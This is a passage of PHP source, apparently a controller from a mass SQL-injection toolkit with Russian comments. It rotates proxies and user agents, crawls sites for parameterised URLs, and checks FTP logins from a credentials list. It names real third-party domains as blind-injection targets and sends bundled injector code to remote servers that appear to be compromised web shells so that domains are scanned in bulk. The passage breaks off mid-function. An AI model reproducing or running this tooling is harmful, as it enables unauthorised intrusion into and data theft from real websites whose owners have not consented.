			
			
			
			
		}else
		{
			$this->stop();
			$this->d('proxy_all net!!!','proxy_all');
			file_put_contents('proxy_good.txt','bad');
			$this->head_enable = false; 
			die('net proxy');
		}
		
		
		
		//$this->p('END_TIME');
	}
	
	function check($proxy) {//дочерняя функция для чека proxy

		
		
		//, $type = CURLPROXY_SOCKS5
		$s = explode(':',$proxy); 
		$ch = curl_init($this->url2); 
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
		curl_setopt($ch, CURLOPT_HEADER, 1); 
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
		curl_setopt($ch, CURLOPT_TIMEOUT, 5);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
		if($this->uagent != "") curl_setopt($ch, CURLOPT_USERAGENT, $this->uagent); 
		if($this->referer != "") curl_setopt($ch, CURLOPT_REFERER, $this->referer);

		if (isset($s[0]))
		{ 
			curl_setopt($ch, CURLOPT_PROXY, $s[0].':'.$s[1]); 
			//curl_setopt($ch, CURLOPT_PROXYTYPE, $type); 
		}
		
		if (isset($s[2]))
		{ 
			$this->d($proxy);
			curl_setopt($ch, CURLOPT_PROXYUSERPWD, $s[2].':'.$s[3]);		
		}
		
		$buffer = curl_exec($ch);
		if($this->debug_proxy==true){
			
			$this->d($buffer,'$buffer');
			$err     = curl_errno( $ch );
			$errmsg  = curl_error( $ch );
			
			$this->d($err,'$err');
			$this->d($errmsg,'$errmsg');
			
			
			}
		//print_r(curl_errno($ch));
		
		
		
		
		
		if(curl_errno($ch) || $buffer == "" || strpos($buffer, $this->text) === FALSE) 
		{
			$out = false;
		} else 
		{
			$out = $proxy;
		}
		
		// print_r($proxy);
		
		curl_close($ch);
		return $out;
		
	}
	
	
	
	
	
	////////ФУНКЦИИ ПАРСИНГА, ПО СУТИ ВЫНЕСЕНЫ В ОТДЕЛЬНЫЙ СКРИПТ////////
	
	function pars(){
		
		
		
		
		$all_url = array(
		//'hdleecher.com',
		//'hdpornleech.com',
		'http://www.pavillon-hannover.de'); 
		
		$cmh = curl_multi_init();

		$tasks = array();
		
		
		foreach($all_url as $url)
		{
			$ch = $this->parscurl($url);
			
			$tasks[$url] = $ch;
			
			
			curl_multi_add_handle($cmh, $ch);
		}
		
		//$this->d($tasks[$url],'$tasks[$url]');
		
		$active = null;
		
		do 
		{
			$mrc = curl_multi_exec($cmh, $active);			
		}
		while ($mrc == CURLM_CALL_MULTI_PERFORM);
		
		
		$engeen_addr = array('tube','google','topic=','modules.php','act=Help','module=forums','module=help','name=News','name=Pages','name=Content','option=com','option=com_content','viewtopic.php','thread.php','showtopic=','showthread.php','forum','facebook');
		

		while ($active && ($mrc == CURLM_OK)) 
		{

			if (curl_multi_select($cmh) != -1) 
			{
				
				do 
				{
					
					
					$mrc = curl_multi_exec($cmh, $active);

					$info = curl_multi_info_read($cmh);
					
					
					
					
					if ($info['msg'] == CURLMSG_DONE) 
					{
						$ch = $info['handle'];
						
						$url = array_search($ch, $tasks);
						
						if ($info['result']==0) //Проверка на ошибки
						{
							$tasks[$url] = curl_multi_getcontent($ch);
							
							//$this->d($tasks[$url],'$tasks[$url]');
							
							$vnut=array();
							$vnech=array();
							//preg_match_all("/<[Aa][\s]{1}[^>]*[Hh][Rr][Ee][Ff][^=]*=[ '\"\s]*([^ \"'>\s//]+)[^>]*>/", curl_multi_getcontent($ch), $matches);
							@preg_match_all('/((http|https):\/\/)?(www\.)?[\w\-_]+(\.[\w\-_\.]+\/)((\/[a-zA-Z0-9]+\/)|)([a-zA-Z0-9\/]+\.[a-zA-Z0-9]+\?)([a-zA-Z0-9]+)(\s*\=)([a-zA-Z0-9\/_.-]+)/im', curl_multi_getcontent($ch), $matches); 
							
							
							//$this->d(curl_multi_getcontent($ch),'curl_multi_getcontent($ch)');
							$p = 0;
							$this->d($matches,'$matches');
							
							
							
							if(empty($matches[0]))
							{
								$this->d('empty($matches)');
								
								@preg_match_all('/((\/[a-zA-Z0-9]+\/)|)([a-zA-Z0-9\/]+\.[a-zA-Z0-9]+\?)([a-zA-Z0-9]+)(\s*\=)([a-zA-Z0-9\/_.-]+)/im', curl_multi_getcontent($ch), $matches);
								$p = 1;
							}
							
							$getN = array(); 
							$fenN = array(); 
							
							foreach($matches[0] as $get) 
							{ 
								$get = str_replace($http, '', $get); 
								
								if(!in_array($get, $getN)) 
								{ 
									$nm = parse_url($get);
									
									
									$name2 = str_replace('?', '', $nm['host']);
									
									@preg_match_all('/(.*)(\?)/', $get, $gn);
									$name = str_replace('?', '', $gn[1][0]);
									$this->d($name,'$name - reg');
									

									
									
									if(!@in_array($name2, $fenN) && @in_array(substr(strrchr($name, "."), 1), array('php')))
									{ 
										
										$get = str_replace('http://','',$get);
										$get = str_replace('https://','',$get);
										
										
										$get = str_replace('%26', '&', $get);
										$get = trim($get);
										
										if($p == 1)
										{
											$h1 = parse_url($url);
											$this->d($h1);
											
											if($h1['host'] !='')
											{
												$get = $h1['host'].$get;
											}else
											{
												$get = $h1['path'].'/'.$get;
											}
											
										}
										$get = str_replace('//','/',$get);										
										$get = str_replace($engeen_addr, 'DICK!', $get);
										$get = 'http://'.$get;
										
										if(!strstr($get,'DICK!') AND strstr($get,'?'))
										{
											$getN[] = $get; 
										}	
										
										$fenN[] = $name2; 
									}    
								}    
							}
							
							
							

							$getN = array_unique($getN);	
							
							$this->d($getN,'$getN');
							$this->d($fenN,'$fenN');
							//$this->d($fenN,'$fenN');
							
							
						}else
						{
							$err     = curl_errno($ch);
							$errmsg  = curl_error($ch);
							$header  = curl_getinfo($ch);
							if ($err<>0)
							{
								echo 'Страница ' .$header['url'].' не была загружена из-за ошибки http_code: '.$header['http_code'].' err:' .$err.', errmsg: '.$errmsg;
							}
						}
						
						
						curl_multi_remove_handle($cmh, $ch);	
						curl_close($ch);
						
						
					}	
				}
				while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}else{
				echo 'ahtung';
			}
			
			$b++;
		}
		
	}
	
	function parscurl($url){

		
		$ch = curl_init($url);
		
		$uagent = array(
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial",		  
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; E-nrgyPlus; .NET CLR 1.1.4322; InfoPath.1)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; SV1; .NET CLR 1.0.3705)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; ds-66843412; Sgrunt|V109|1|S-66843412|dial; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; eMusic DLM/3; MSN Optimized;US; MSN Optimized;US)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; elertz 2.4.025; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; elertz 2.4.179[128]; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; InfoPath.1)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; YPC 3.2.0; .NET CLR 1.1.4322; yplus 5.3.04b)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iOpus-I-M; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; InfoPath.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; Sgrunt|V109|1746|S-1740532934|dialno; snprtz|dialno; .NET CLR 2.0.50727)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=; YPC 3.2.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; IEMB3; IEMB3; yplus 5.1.04b)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=none; FunWebProducts; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=none; SV1; snprtz|S04087544802137; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; yplus 5.6.02b)");
		
		///рандомные значения
		$rand_keys = array_rand ($this->proxy);
		$s = explode(':',$this->proxy[$rand_keys]);
		$ua = trim($uagent[mt_rand(0,sizeof($uagent)-1)]);	
		
		curl_setopt($ch, CURLOPT_URL, $url);           //url страницы
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   //возращаться в файл 
		curl_setopt($ch, CURLOPT_HEADER, 1);           //возвращать заголовки
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);   //переходить по ссылками 
		curl_setopt($ch, CURLOPT_ENCODING, "");        //работать с любыми кодировками 
		curl_setopt($ch, CURLOPT_USERAGENT, $ua);  	 //useragent
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);  //таймаут соединения 
		curl_setopt($ch, CURLOPT_TIMEOUT, 10);         //тоже самое 
		curl_setopt($ch, CURLOPT_MAXREDIRS, 10);       //количество переходов 
		

		
		return $ch;
		
		
		

	}
	
	
	
	
	
	
	
	function checkftp(){  //////////FTP//////////
	
	$data = file($_SERVER['DOCUMENT_ROOT']."/app/webroot/ftp.txt");
	
	
	
	$all = count($data);
	
	  $all = count($data); 
	  for ($i = 0; $i < $all; $i++)
	  { 
		$data[$i] = str_replace("\n", "", $data[$i]); 
		$data[$i] = str_replace("\r", "", $data[$i]); 
		
	 
		list($lp, $domain) = explode("@", $data[$i]); 
		list($login, $password) = explode(":", $lp); 
		
		
	//	$this->d('domain',$domain);
		
		$open = ftp_connect($domain, 21, 10);
		
		if(!$open)
		{
			
			$this->d($domain,'not ftp connect');
			exit;
		}
		
		if (!ftp_login($open, $login, $password)){
			
			$this->d("Не могу соединиться c ".$login.'-'.$password);
			continue;
		}
		
		$this->d($login.'-'.$password,'good');
		
			
		flush(); 
	  } 
	 
} 

	function checkmysql(){//////////MYSQL//////////
		
	}
	
	function parseForm($url){
		//http://testphp.vulnweb.com/secured/newuser.php?
		//signup=signup&uaddress=fffff&ucc=dadw&uemail=sample%40email.tst&upass=bbbbb&upass2=bbbbb&uphone=555-666-0606&urname=obdgpyws&uuname=aaaaa
		
		//$url = 'http://testphp.vulnweb.com/signup.php';
		$url = 'http://testphp.vulnweb.com/login.php';
		//$url = 'http://testphp.vulnweb.com/search.php';
		
		//$url = 'http://allprikol.ru/catalog/search.php';
		
		//$url = 'http://www.archetype.co.uk/';
		//search=%Inject_here%&submit.x=71&submit.y=9&submit=Search

		//$url = 'http://www.pension-oelke-neuruppin.de/comp1.php?lang=sp&tplid=2&hid=1796';
		$mysqlInj = new $this->Injector();
		
		
		
		$mysqlInj->form_start($url);
		
		//$this->d($mysqlInj->form_set,'form_set');
		//exit;
		
		//$mysqlInj->inj_test($url); //передаем url, всё всё подставляеться
		
		//$this->d($mysqlInj->form_set,'$this->form_set');
		
		//$mysqlInj->inject_all_post($url); 
	    
		
		
		//$mysqlInj->inject_post($url);
		//$mysqlInj->inject($url);
		
		
		
	
		//$mysqlInj->inject($getform);
		
		
		
		
		
	}
	
	function blind_new($url){
		
		$url = 'http://www.autosaar.de/rubrikenblock.php?rub=3';
		
		$mysqlInj = new $this->Injector();
		//$mysqlInj->sleep_check2 = true;
		
		//$res = $mysqlInj->sqli($url);
		
		$res = $mysqlInj->blind($url);
		$this->d($res,'res');
	}
	
	
	
	
	///////// ДОМЕНЫ ///////////
	
	
	function crowler($domen='testphp.vulnweb.com'){//сканирование одиночного домена
		
		$domen = 'my.tsianalytics.com';
		
		
		$res = $this->check_domen_red($domen);
		if(!res){$this->d($domen,'bad'); exit;}
		
		
		$exp  = explode('::',$res);
		
		$this->d($exp,'$exp');
		
		$domen = $exp[0];
		
		
		
		
		
		
		$mysqlInj = new $this->Injector();
		
		if($exp[1] =='https'){
			
			$mysqlInj->https = true;
		}
			
		$res = $mysqlInj ->start_crowler($domen);
		
		$this->d($res,'res');
	}
	
	function post_input($rrr=''){//Принимает успешно потенциальные с других сайтов
			
		
		$link =base64_decode($this->data);
		
		$check =$this->check;
		
		
		$this->d($this->data,'data');
		
		$this->d($link,'$link');
			//if($link =='')
			//{	
				//$pusto++;
				//continue;
			//}
			
			if(preg_match("/get::/i",$link))
				{
					$link = str_replace('get::','',$link);	
					$header = 'get';
				}elseif(preg_match("/post::/i",$link)){
					$link = str_replace('post::','',$link);	
					$header = 'post';
				}else{
					$header = 'get';
				}
				
			$tmp2 = explode('::',$link);
			$link = $tmp2[0];
			$type = $tmp2[1]; 
				
				
				
				$this->d($link,'$link');
		
			//$base = mysql_real_escape_string($link);
			//$base = str_replace(array('union','select','and','or'),'',$base);
	
			$this->mysqlInj = new $this->Injector();
			
			$clean = $this->mysqlInj->filter_url($link);
			
			$this->d($clean,'clean');
			
			$rr = parse_url('http://'.$clean);
			$this->d($rr,'rr');
			$domen = $rr['host'];
			//$domen = $this->mysqlInj->filter_url($domen);
			
			$domen = str_replace('www.','',$domen);
			
			$date = date('Y-m-d h:i:s');
						
			//$jj = explode('?',$clean);	

			$path_query = $rr['query'];	

			
			$count = $this->Filed->query("select count(*) FROM `posts_all` WHERE `domen` like '%$domen%'");
				
				$ccc = $count[0][0]['count(*)'];
				
			
			
				
				//$this->d($count,'$count');
				//$this->d($this->$domen,'$this->$domen');
			if($check==0){
				
				$type2=0;
				
			}elseif($check==1){
				$type2 = 2;
			}	
				
			if($ccc < $this->link_count)
			{

			
				if($path_query !='')
				{
					
					
					
					
					if($this->Post->query("INSERT INTO `posts_all` (`domen`,`url`,`gurl`,`date`,`header`,`path_query`,`find`,`status`,`from`) VALUES('{$domen}','{$clean}','{$clean}','{$date}','{$header}','{$path_query}','{$type}',$type2,'crowler')"))
					{
							$this->d('insert good');
							
					}else{
						
						echo mysql_error();
					}
					
						echo "INSERT INTO `posts_all` (`domen`,`url`,`gurl`,`date`,`header`,`path_query`,`find`,`status`,`from`) VALUES('{$domen}','{$clean}','{$clean}','{$date}','{$header}','{$path_query}','{$type}',$type2,'crowler')";
					
					
				}else{
					$this->d('path_quetry pustoy');
				}		
	
			}
	}
	
	function check_domens(){//проверка доменов на www и https
		
		$this->timeStart = $this->start('check_domens',1);
		$file = $this->Post->query("SELECT * FROM `domens` WHERE `domen_check`=0 AND `bad` !=1 limit ".$this->error_limit_check);
		
		$this->d($file,'$file');
		//exit;
		
		$time_all = time();
		$time2 = 1000;
		
		
		foreach ($file as $val)
		{
			
			$new = time();
			$razn = $new-$time_all;
			
			
			
			
			$id = $val['domens']['id'];
			$this->d($val,'$val');
			$domen = $val['domens']['domen'];
			
			
			$this->d($domen,'$domen');
			//exit;
			
			$this->Post->query("UPDATE  `domens`  set `domen_check`=1 WHERE `id`=$id ");
			
			
			//стопаем перебор если слишком долго идет
			if($razn>$time2){
				$this->d('TIME!!!! ALL');
				$this->Post->query("UPDATE  `domens`  set `bad` = 1,`status`=1,`domen_check`=1 WHERE `id`=$id ");
				$this->stop();
				
				return false;
				
			
			}
			
			
			$res = $this->check_domen_red($domen,$this->time_check_domens);
			
			
			$this->workup();
			
			if($res===false)
			{
				
				$this->Post->query("UPDATE  `domens`  set `bad` = 1,`status`=1,`domen_check`=1 WHERE `id`=$id ");
			}else
			{
			
				$exp  = explode('::',$res);
				$this->d($exp,'$exp');
				
				if($exp[1]=='https')
				{
					$domen_new = $exp[0];
					$http='https://';
				}elseif($exp[1]=='http')
				{
					$domen_new = $exp[0];
					$http='http://';
				}else{
					$domen_new = $exp[0];
					$http='http://';
				}
				$this->Post->query("UPDATE  `domens`  set `domen_new` = '$domen_new',`http`='$http',`domen_check`=1 WHERE `id`=$id ");
			}
			
			
			
			//exit;	
		}
		
		
		
		$this->stop();
		
	}
	
	function check_domen_red($domen,$time_check_domens=30){//дочерняя функция
		$domen = str_replace(array('http://','htpps://','www.'),'',$domen);
		
		$ch = curl_init(); 
		
		$headers = array
		(
			'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8',
			'Accept-Language: ru,en-us;q=0.7,en;q=0.3',
			'Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7'
		); 

		      $uagent = array(
"Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial",		  
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; E-nrgyPlus; .NET CLR 1.1.4322; InfoPath.1)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; SV1; .NET CLR 1.0.3705)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; ds-66843412; Sgrunt|V109|1|S-66843412|dial; .NET CLR 1.1.4322)");
		
		  ///рандомные значения
		
		$ua = trim($uagent[mt_rand(0,sizeof($uagent)-1)]);	
		
	//	$domen = 'http://www.lovexcape.com';
		curl_setopt( $ch, CURLOPT_HTTPHEADER,$headers); 
		curl_setopt ($ch, CURLOPT_URL,$domen);
		curl_setopt ($ch, CURLOPT_HEADER, 1);
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
		//curl_setopt ($ch, CURLOPT_FAILONERROR, 1); // Fail on errors
		curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 10);
		curl_setopt ($ch, CURLOPT_REFERER, $domen);
		curl_setopt ($ch, CURLOPT_USERAGENT, $ua);
		curl_setopt ($ch, CURLOPT_MAXCONNECTS,3);
		curl_setopt ($ch, CURLOPT_TIMEOUT, $time_check_domens);  
		//curl_setopt ($ch, CURLOPT_COOKIEFILE, 'coo.txt'); 
		//	curl_setopt ($ch, CURLOPT_COOKIEJAR, 'coo.txt'); 
		
		$data =	   curl_exec( $ch );
		$err     = curl_errno( $ch );
		$errmsg  = curl_error( $ch );
		$head =    curl_getinfo( $ch );
		
		$this->d($err,'$err');
		$this->d($errmsg,'$errmsg');
		
		file_put_contents('./file_domen.txt',$data);
		
		//exit;
		
		if (preg_match('/Location: ([\S]+)\b/',$data,$rr))
		{
			
			$url = preg_replace("#$#", "", $rr[1]); 
			if (preg_match('/^(http:\/\/)?(www.)?'.$domen.'/si', $url))
			{ 
				$url = str_replace('http://','',$url);
				
				//доп проверка на https
				$ch2 = curl_init();
				curl_setopt ($ch2, CURLOPT_HTTPHEADER,$headers); 
				curl_setopt ($ch2, CURLOPT_URL,'https://'.$url.":443");
				curl_setopt ($ch2, CURLOPT_HEADER, 1);
				curl_setopt ($ch2, CURLOPT_RETURNTRANSFER, 1); 
				curl_setopt ($ch2, CURLOPT_FOLLOWLOCATION, 1);
			//	curl_setopt ($ch2, CURLOPT_FAILONERROR, 1); // Fail on errors
				curl_setopt ($ch2, CURLOPT_CONNECTTIMEOUT, 10);
				//curl_setopt ($ch2, CURLOPT_CONNECTTIMEOUT_MS, 1);
				curl_setopt ($ch2, CURLOPT_TIMEOUT, 10); 
				curl_setopt ($ch2, CURLOPT_MAXCONNECTS,3);
				curl_setopt ($ch2, CURLOPT_REFERER, $domen);
				curl_setopt ($ch2, CURLOPT_USERAGENT, $ua);
				//curl_setopt ($ch2, CURLOPT_COOKIEFILE, 'coo.txt'); 
				//curl_setopt ($ch2, CURLOPT_COOKIEJAR, 'coo.txt'); 
				
				$data2 =	curl_exec( $ch2 );
				$err2     = curl_errno( $ch2 );
				$errmsg2  = curl_error( $ch2 );
				$head2 =    curl_getinfo( $ch2 );
				
				//$this->d($head2,'$head2');
				
				if($head2['http_code']==200 or $head2['http_code']=='200'){
					return $url."::https";
					
				}else{
					
					return $url."::http";
				}
					
			}elseif(preg_match('/^(https:\/\/)?(www.)?'.$domen.'/si', $url))
			{
				$url = str_replace('https://','',$url);
				return $url."::https";
			}else{
				return false;
				
			}
			
		}else
		{
			$inf = 'http://seoanalitics.ru/audit/ajax-poisk-1.php?start=0&q=info:' .$domen;
			
			if (file_get_contents($inf))
			{
				$ginfo = file_get_contents($inf);
				
				$ginfo = eregi_replace ( "(.*)<li><a href=","",$ginfo);
				$ginfo = eregi_replace ( " >(.*)","",$ginfo);
				$ginfo = eregi_replace ( "https://","",$ginfo);
				$ginfo = eregi_replace ( "http://","",$ginfo);
				if(substr($ginfo,-1)=='/')$ginfo = substr($ginfo,0,-1);
				
				if (preg_match('/^(http:\/\/)?(www.)?'.$domen.'/si', $ginfo))
				{ 
					return $ginfo."::http";
				}
			}
			
			
			return $domen.'::http';
			
		}
		
		
		
		
	}
	
	function find_domen_sqli($test=''){//поиск sqli в доменах
		
		
		//$this->check_domens();
		
		
		$this->domens = true;
		
		$file = $this->Post->query("SELECT count(*) as count FROM `domens` WHERE `status`=0 AND `domen_check`=1");
		
		
		

		if(intval($file[0][0]['count'])!==0)
		{		
			$this->timeStart = $this->start('find_domen_sqli',1);
		}else
		{
			$this->d($file,'$file count');
			die('TimeStart');
		}		
		
		
		
		//exit;
		
		
		
		$r = rand(1,100);
		
		
		
		$this->Post->query("UPDATE  `domens`  set `domen` =  REPLACE(url,'http://','')");
		
		
		
		$urls = $this->Post->query("SELECT * FROM `domens` WHERE `status`=0 AND `domen_check`=1 AND `bad` !=1  AND `domen_new` !='' limit ".$this->error_limit_domen);
		
		
	$this->d($urls,'$urls');
		
	
		$this->local_shells = true;
		$this->evaltest();
		
	
		
		$this->proxyCheck();
		
		
		$serv  = $this->serv;
		
		
		
		
		
		
		$filename = str_replace('webroot/index.php', 'controllers/components/injector.php',$_SERVER['SCRIPT_FILENAME']);
		$injectorfile = file_get_contents($filename);
		$code = str_replace('URLURL', 'URLURL', file_get_contents('crawler.php'));
		$conf = file_get_contents($_SERVER['DOCUMENT_ROOT'].'/config.php');
		$conf = str_replace(array('<?php','?>'), '', $conf);
		$injconf = str_replace('include($_SERVER["DOCUMENT_ROOT"]."/config.php");', $conf , $injectorfile);
		
		$this->code = str_replace(array('<?php','?>'), '', $injconf.$code);
		
		
		
		
		
		////
		
		$cmh = curl_multi_init();

		
		$tasks = array();

		$count_serv = count($serv);
		$count_urls = count($urls);
		$i=0;

		
		
		
		
		
		$this->d($count_serv,'count_serv_kolichetvo!!');
		
		$this->d($count_urls,'$count_domenov');
		
		$newservv = $serv;
	

		for($i=0;$i<$count_urls;$i++)
		{
			
			
			
			$this->workup();
			
			if($i==$count_serv or count($urls) == 0)
			{
				$this->d($i,'count->break'); 
				break;
			}
			
			flush();
			
			//$urs_shell = array_shift($newservv);
			
			
			$kkk = count($newservv);
			$lll = mt_rand(1,$kkk);
			$urserv = $newservv[$lll];
			$urs_shell = $urserv;
			
			
			$urs_one = array_shift($urls);
			
			$urs_shell = trim($urs_shell);
			
			
			
			//$this->d($urs_shell,'$urs_shell');
			
			if(!empty($urs_shell))
			{
				
				$urlllll = trim($urs_one['domens']['domen_new']); 
				$urlllll = $urs_one['domens']['http'].$urlllll;
				$urlllll = trim($urlllll);
				
			
				
			
				
				$ch = $this->create_streem($urs_shell,$urlllll,$this->time_crowler);	
				$tasks[$urlllll.':::'.$urs_one['domens']['id']] = $ch;
				//$this->d($tasks,'task all');
				
				curl_multi_add_handle($cmh, $ch);
			}
		}
		
		
		//$this->d($tasks,'$tasks');
		//exit;
		
		
		
		/////////
		
		
		
		
		
		$active = null;

		do 
		{
			$mrc = curl_multi_exec($cmh, $active);
		}
		while ($mrc == CURLM_CALL_MULTI_PERFORM);


		while ($active && ($mrc == CURLM_OK)) 
		{

			if (curl_multi_select($cmh) != -1) 
			{
				do 
				{
					
					$mrc = curl_multi_exec($cmh, $active);

					$info = curl_multi_info_read($cmh);
					
					

					if ($info['msg'] == CURLMSG_DONE) 
					{
						$ch = $info['handle'];
						
						$this->d($ch,'ch');
					
					
					  //	$this->d($tasks,'task one!!');
						
						
						$ku = array_search($ch, $tasks);
					
					    
						
						
						if ($info['result']==0) //Проверка на ошибки
						{
							
							$tmp = curl_multi_getcontent($ch);
							
							
							$this->d($tmp,'$tmp curl_multi_getcontent');
							
							
							//$tasks[$ku] = trim($tmp);
							
							
							$this->d($ku,'$ku');	
						
							$cont = $tmp;
							
							
							if($this->debug==true){
								
								$this->d($cont,'$cont domens');
							}
						
							$ttt = explode(':::', $ku);
							$url['domens']['domen_new'] = $ttt[0];
							$url['domens']['id'] =  $ttt[1];
							
						
							$url2 = $url['domens']['domen_new'];
						
						
						    $this->d($url,'url mass');
						
						
						
						
							flush();
							
							
							
							
							//$filename = $_SERVER['DOCUMENT_ROOT']."/app/webroot/blackshell.txt";	
							//$fh = fopen($filename, "a+");
							
							//if(strstr($tasks[$url],'Internal Server Error') or strstr($tasks[$url],'405 Not Allowed')  or strstr($tasks[$url],'TURKHACKTEAM') or strstr($tasks[$url],'Während der Anfrage'))
							//{	
								//	$this->d('Internal Server Error');
								//	if(trim($url) !='')fwrite($fh, trim($url)."\r\n");
									
							//}	
					
							//if($this->debug==true){$this->d($cont,' - 111111$url OTVET '.$url['domens']['domen_new']);}
							
							
							$cont = explode(':::', $cont);
							$cont[1] = trim($cont[1]);
							$cont[2] = trim($cont[2]);
							
						    if($this->debug==true){$this->d($cont,'-cont OTVET '.$url['domens']['domen_new']);}
							
							
							$cont[0] = str_replace('http://http://','http://',trim($cont[0]));
							$cont[0] = str_replace('http://	http://','http://',trim($cont[0]));
							$cont[0] = str_replace('http://http:// ','http://',trim($cont[0]));
							$cont[0] = str_replace('http://','',trim($cont[0]));
							$cont[0] = str_replace('https://','',trim($cont[0]));
							$cont[0] = str_replace('www.','',trim($cont[0]));
							$cont[0] = mysql_real_escape_string ($cont[0]);
							$ddd = $cont[0];
							
							$tmp11 = 'http://'.$ddd;
							$tmp22 = parse_url($tmp11);
							$domen33 = $tmp22['host'];
							
							//$cont[0] = urldecode($cont[0]);
							
							//$cont[1] = str_replace('http://http://','http://',trim($cont[1]));
							//$cont[1] = str_replace('http://	http://','http://',trim($cont[1]));
							//$cont[1] = str_replace('http://http:// ','http://',trim($cont[1]));
							//$cont[1] = str_replace('http://','',trim($cont[1]));
							//$cont[1] = str_replace('https://','',trim($cont[1]));
							//$cont[1] = urldecode($cont[1]);
							
							
						}

						
					if(!strstr($cont[2],'false') AND trim($cont[2])!=='' AND trim($cont[0])!=='' AND trim($cont[1])!=='')
						{
							
							
							
						
							
							$id = $this->Post->query("SELECT `id` FROM `domens` WHERE `id` = ".$url['domens']['id']." limit 1");
							
							
							if($this->debug==true){$this->d("SELECT `id` FROM `domens` WHERE `id` = ".$url['domens']['id']." limit 1");}
							
							if(count($id)==1)
							{
								
									$this->d('domen found SQLI OK!!!!');
									
									if($this->Post->query("UPDATE `domens` SET `find`='".$cont[2]."',`status`=2 WHERE `id`=".$id[0]['domens']['id']))
									{
										$this->d(" GOOD !!! UPDATE `domens` SET `find`='".$cont[2]."',`status`=2 WHERE `id`=".$id[0]['domens']['id'],'good');
									}else{
										
										$this->d(" NOOO !!! UPDATE `domens` SET `find`='".$cont[2]."',`status`=2 WHERE `id`=".$id[0]['domens']['id'],'good');
									}
									
									
								
								
							}else
							{
								$this->d('domen OK! id  NOT found!!  '. $cont[1]);
							}
							
						}
						
						
						if(strstr($cont[2],'false') AND trim($cont[0])!=='')
						{
								
													//"SELECT `id` FROM `domens` WHERE `id` = '".$url['domens']['id']."' limit 1"
							$id = $this->Post->query("SELECT `id` FROM `domens` WHERE `id` = ".$url['domens']['id']." limit 1");
							
							$this->d("SELECT `id` FROM `domens` WHERE `id` = ".$url['domens']['id']."  limit 1");
							
							if(count($id)==1)
							{
								$this->Post->query("UPDATE `domens` SET `status`=1 WHERE `id` =".$id[0]['domens']['id']);
								$this->d("UPDATE `domens` SET `status`=1 WHERE `id` =".$id[0]['domens']['id'],'good update');
							}else
							{
								$this->d($domen33,'HUEVO  FALSE 1 id NOT found!!');
								
								$kk = parse_url('http://'.$cont[0]);
								$hh = $kk['host'];
								
									$id2 = $this->Post->query("SELECT `id` FROM `domens` WHERE `domen_new` like '".$domen33."%' or `id`=".$url['domens']['id']." limit 1");
									
									
									if(count($id2)==1)
									{
										$this->Post->query("UPDATE `domens` SET `status`=1 WHERE  `domen_new` like '".$domen33."%'");
										$this->d(" POPITKA 2 UPDATE `domens` SET `status`=1 WHERE  `domen_new` like '".$domen33."%'");
									}else
									{
										$this->d('HUEVO2222 daje LIKE ne SMOG naiti');
									}
								
							}
							
						}

						//flush();

						
						
						
					curl_multi_remove_handle($cmh, $ch);

					curl_close($ch);	
					unset($ch);
					unset($url);
					unset($ku);
					unset($domen33);
						
						if(count($urls)>0)
						{	
							
							$newservv = $serv;
							
							//$urs_shell = array_shift($newservv);
							
							
							$kkk = count($newservv);
							$lll = mt_rand(1,$kkk);
							$urserv = $newservv[$lll];
							$urs_shell = $urserv;
							
							echo 'zapusk dopolnitelno<br>';	
							
							
							
							
							$urs_one = array_shift($urls);
							
							$urs_shell = trim($urs_shell);
							
							//$urs_one = trim($urs_one);
							
							
							
							$this->d($urs_shell,'$urs_shell');
							
							if(!empty($urs_shell))
							{
								
								$urlllll = trim($urs_one['domens']['domen_new']); 
								$urlllll = trim($urlllll);
								$urlllll = $urs_one['domens']['http'].$urlllll;
						
								$this->d($urlllll,$urs_shell);
						
					
								if($urlllll !='')
